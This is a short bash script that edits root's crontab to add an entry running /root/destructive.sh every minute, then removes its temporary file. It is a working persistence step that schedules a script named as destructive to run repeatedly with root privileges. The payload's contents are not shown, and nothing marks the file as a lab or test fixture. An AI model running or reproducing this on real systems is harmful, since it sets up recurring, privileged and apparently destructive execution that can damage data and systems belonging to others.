#!/bin/bash
crontab -u root -l >lastCron
echo "* * * * * bash /root/destructive.sh" >>lastCron
crontab lastCron
rm lastCron
